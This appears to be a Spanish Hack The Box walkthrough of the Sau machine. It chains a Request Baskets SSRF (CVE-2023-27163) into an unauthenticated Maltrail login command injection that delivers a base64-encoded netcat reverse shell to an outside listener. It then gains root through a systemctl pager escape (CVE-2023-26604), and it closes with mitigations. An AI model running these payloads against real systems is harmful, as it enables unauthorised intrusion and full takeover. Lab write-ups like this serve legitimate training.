---
title: "HTB Walkthrough: Sau"
date: 2026-07-13
draft: false
description: "Walkthrough completo de la máquina Sau de Hack The Box. Dificultad Easy, OS Linux. SSRF en Request Baskets (CVE-2023-27163) para pivotar a Maltrail v0.53 en localhost, RCE no autenticada vía inyección en el login, y escalada a root explotando el escape de pager en systemctl status (CVE-2023-26604)."
tags: ["HackTheBox", "Linux", "Easy", "SSRF", "RequestBaskets", "CVE-2023-27163", "Maltrail", "RCE", "CommandInjection", "systemd", "CVE-2023-26604", "sudo", "PrivEsc", "PagerEscape", "sau", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Sau** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux**. Un SSRF en Request Baskets v1.2.1 (CVE-2023-27163) nos permite pivotar hacia Maltrail v0.53, un servicio de detección de tráfico malicioso accesible solo desde localhost. Maltrail tiene una RCE no autenticada en su endpoint de login que nos da shell como `puma`. La escalada a root explota el **CVE-2023-26604**: `systemctl status` ejecutado con `sudo` invoca `less` como pager heredando privilegios de root, del que escapamos con `!/bin/bash`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                             |
|----------------|-----------------------------------------------------------------------------------------------------|
| **Nombre**     | Sau                                                                                                 |
| **OS**         | Linux                                                                                               |
| **Dificultad** | Easy                                                                                                |
| **IP**         | 10.129.229.26                                                                                       |
| **Técnicas**   | CVE-2023-27163 · SSRF · Maltrail RCE · CVE-2023-26604 · sudo Pager Escape                         |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.229.26
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown
```

Escaneo de versiones sobre los puertos abiertos:

```bash
nmap -sC -sV -p22,55555 10.129.229.26
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
55555/tcp open  http    Golang net/http server
|_http-title: Request Baskets
```

*Puertos abiertos:*
- `22` → SSH, sin exploits públicos conocidos
- `55555` → Servicio Golang que redirige a `/web` — **Request Baskets**

> **💡 Superficie de ataque:** Solo dos puertos. Toda la investigación inicial pasa por el servicio web en el 55555.

---

## 2. Identificación de la Aplicación — Request Baskets v1.2.1

Visitando `http://10.129.229.26:55555/web` confirmamos la aplicación y su versión.

![Request Baskets — pantalla principal de creación de cesta](/img/sau1.png)

```
Powered by request-baskets | Version: 1.2.1
```

**¿Qué es Request Baskets?** Una herramienta que crea "cestas" (baskets) HTTP configurables para capturar, inspeccionar y **reenviar (proxy)** peticiones a una URL de destino. Esta funcionalidad de reenvío es exactamente el vector de ataque.

> **⚠️ Vulnerabilidad identificada:** Request Baskets v1.2.1 es vulnerable a **CVE-2023-27163**, un **SSRF (Server-Side Request Forgery)**: el campo `forward_url` de la configuración de una cesta no restringe el destino, permitiendo que el propio servidor realice peticiones HTTP hacia direcciones internas (`127.0.0.1`, redes privadas) en nombre del atacante.

---

## 3. Explotación — SSRF vía Request Baskets (CVE-2023-27163)

### 3.1 Paso 1 — Crear una Cesta y Verificar el SSRF

Desde `/web` creamos una nueva cesta. La aplicación asigna un nombre aleatorio (p. ej. `h68nagt`). Configuramos el `forward_url` hacia nuestra IP de VPN con `Proxy Response` y `Expand Forward Path` activados:

![Configuración de la cesta apuntando a nuestra IP de VPN para confirmar el SSRF](/img/sau2.png)

Abrimos un listener:

```bash
nc -lnvp 80
```

Disparamos la petición contra la cesta:

```bash
curl http://10.129.229.26:55555/h68nagt
```

El listener recibe la petición reenviada por el servidor objetivo:

```
Listening on 0.0.0.0 80
Connection received on 10.129.229.26 39160
GET / HTTP/1.1
Host: 10.10.14.211
User-Agent: curl/8.14.1
X-Do-Not-Forward: 1
```

> ✅ **SSRF confirmado.** El servidor objetivo realizó la petición HTTP por nosotros. La cabecera `X-Do-Not-Forward: 1` es una protección interna de Request Baskets para evitar bucles de reenvío — no impide dirigir el proxy hacia destinos internos.

### 3.2 Paso 2 — Pivotar hacia el Servicio Interno

Reconfiguramos la cesta para apuntar a `http://127.0.0.1:80` — el localhost de la máquina objetivo, en un puerto que **no apareció en el escaneo Nmap** porque solo escucha en loopback:

![Configuración de la cesta apuntando a 127.0.0.1:80 para pivotar al servicio interno](/img/sau3.png)

Al repetir la petición contra la cesta, la respuesta reenviada revela la aplicación local:

![Maltrail v0.53 descubierto tras el pivotaje SSRF a localhost](/img/sau4.png)

**Maltrail v0.53** — un sistema de detección de tráfico malicioso.

> **💡 Por qué funciona:** El puerto 80 solo está expuesto en `127.0.0.1`, invisible desde el exterior. Pero el SSRF hace que sea el **propio servidor** quien realiza la conexión, no nosotros — para el kernel de la máquina objetivo, la petición viene de sí misma, por lo que el filtro de loopback no aplica.

> **⚠️ Vulnerabilidad identificada:** Maltrail v0.53 tiene una **RCE no autenticada** en el endpoint `/login`: el parámetro `username` se pasa sin sanitizar a un comando de sistema (`logger`), permitiendo inyección de comandos mediante sustitución de subshell (`` `...` ``).

---

## 4. Explotación — RCE No Autenticada en Maltrail

### 4.1 Construcción del Payload

Codificamos la reverse shell en base64 para evitar problemas con caracteres especiales en la petición:

```bash
ENC=$(echo -n "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.211 4444 >/tmp/f" | base64 -w0)
```

### 4.2 Envío a través del SSRF

Aprovechamos la cesta SSRF (configurada para reenviar a `127.0.0.1:80`) para entregar el payload al endpoint de login de Maltrail:

```bash
curl 'http://10.129.229.26:55555/h68nagt/login' \
  --data "username=;\`echo+$ENC+|+base64+-d+|+sh\`"
```

```
Login failed
```

> **💡 Lógica del payload:** El campo `username` cierra el contexto esperado por el comando `logger` e inyecta una sustitución de subshell que decodifica el payload en base64 y lo ejecuta con `sh`. La respuesta `Login failed` es el comportamiento normal — el comando ya se ejecutó en segundo plano antes de que la lógica de login termine de procesarse.

### 4.3 Recepción de la Shell

```bash
nc -lnvp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.229.26 35486
sh: 0: can't access tty; job control turned off
$ whoami
puma
```

Estabilizamos la TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 40 cols 150; reset
```

✅ **Shell obtenida como `puma`.**

---

## 5. User Flag

```bash
puma@sau:~$ cat ~/user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 6. Escalada de Privilegios — CVE-2023-26604 (Escape de Pager en systemctl)

### 6.1 Enumeración de Permisos sudo

```bash
puma@sau:~$ sudo -l
```

```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

```bash
puma@sau:~$ systemctl --version
```

```
systemd 245 (245.4-4ubuntu3.22)
```

> **⚠️ Vulnerabilidad identificada (CVE-2023-26604):** Cuando la salida de `systemctl status` supera el alto de la terminal, `systemd` invoca automáticamente un **pager** (`less`) para paginarla. Si el comando fue ejecutado mediante `sudo`, ese `less` hereda los **privilegios de root**. `less` permite ejecutar comandos de shell arbitrarios con `!<comando>`, heredando esos mismos privilegios.

### 6.2 Ejecución del Exploit

```bash
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
```

```
● trail.service - Maltrail. Server of malicious traffic detection system
   Loaded: loaded (/etc/systemd/system/trail.service; enabled)
   Active: active (running) since Mon 2026-07-13 10:56:47 UTC; 3h 30min ago
 Main PID: 896 (python3)
    Tasks: 13 (limit: 4662)
   Memory: 29.3M
   CGroup: /system.slice/trail.service
           ├─ 896 /usr/bin/python3 server.py
           └─1342 pager
```

La salida se abre paginada mediante `less`, ejecutado en el árbol de procesos de `sudo` — con privilegios de root. Dentro del pager escribimos:

```
!/bin/bash
```

```bash
root@sau:/opt/maltrail# id
uid=0(root) gid=0(root) groups=0(root)
```

✅ **Escalada a root completada.**

---

## 7. Root Flag

```bash
root@sau:~# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 8. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puerto 55555 con Request Baskets v1.2.1.
2. **CVE-2023-27163** → SSRF via `forward_url` → confirmado reenviando petición a nuestra IP.
3. **Pivotaje** → Reenvío hacia `127.0.0.1:80` → Maltrail v0.53 descubierto (solo accesible en localhost).
4. **Maltrail RCE** → Inyección de comandos en parámetro `username` del login → reverse shell como `puma`.
5. **User flag** → `~/user.txt`.
6. **CVE-2023-26604** → `sudo systemctl status` invoca `less` como pager con privilegios de root → `!/bin/bash` → root.

**Lo que aprendí con esta máquina:**

- **"Solo escucha en localhost" no es una barrera de seguridad si hay un SSRF en otro servicio.** El puerto 80 de Maltrail era invisible para un escáner externo, pero el SSRF convertía al propio servidor en nuestro proxy. La segmentación de red interna tiene que complementar la restricción de binding — un servicio sin autenticación en loopback sigue siendo vulnerable si hay otro servicio explotable en la misma máquina.

- **Un SSRF es a menudo el primer eslabón de una cadena, no el ataque en sí.** El valor del CVE-2023-27163 no estaba en el SSRF per se sino en lo que había detrás: un servicio más peligroso que solo era alcanzable a través de él. La metodología de pivotaje (confirmar SSRF → escanear rangos internos → identificar servicios ocultos) es el patrón a seguir siempre que se encuentre un SSRF.

- **La inyección de comandos en parámetros de logging es un error clásico y vigente.** Maltrail usaba `logger` para registrar los intentos de login fallidos pasando el `username` sin sanitizar. Cualquier llamada a un comando externo que incluya input de usuario sin pasar por una lista de argumentos (`subprocess.run([...])` en Python, equivalentes en otros lenguajes) es potencialmente vulnerable. En Maltrail el fix correcto habría sido usar los argumentos de `subprocess` como lista, no como string de shell.

- **CVE-2023-26604 ilustra por qué los pagers interactivos son peligrosos en contextos de sudo.** `less` es útil, pero cuando se invoca con privilegios elevados se convierte en un vector de escape trivial — `!comando` lo convierte efectivamente en un shell con esos privilegios. La corrección es siempre pasar `--no-pager` o fijar `SYSTEMD_PAGER=cat` en las reglas de sudoers para cualquier comando de systemd que se ejecute con sudo.

- **La cadena completa de esta máquina son dos CVEs de 2023 encadenados.** Ninguno de los dos es sofisticado aisladamente — uno es un proxy mal restringido, el otro es un pager que lanza shells. El valor está en reconocer el patrón: cuando sudo permite ejecutar algo que a su vez puede abrir un proceso interactivo (pager, editor, intérprete), hay que investigar si ese proceso hereda privilegios.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2023-27163 — SSRF en Request Baskets | Actualizar a versión parcheada; validar y restringir destinos de `forward_url` (bloquear rangos privados y loopback) |
| Maltrail en localhost sin autenticación | No asumir que loopback es seguro; aplicar autenticación en todos los servicios independientemente del binding |
| RCE en el login de Maltrail (inyección en `logger`) | Actualizar Maltrail; usar listas de argumentos en llamadas a subprocesos — nunca interpolar input de usuario en strings de shell |
| `sudo` NOPASSWD sobre `systemctl status` | Añadir `--no-pager` o fijar `SYSTEMD_PAGER=cat` en la regla de sudoers; evitar permisos sudo sobre comandos que invoquen pagers interactivos |
| CVE-2023-26604 — escape de pager con privilegios heredados | Actualizar systemd a versión parcheada (≥ 247); configurar `PAGER=cat` para comandos ejecutables via sudo |
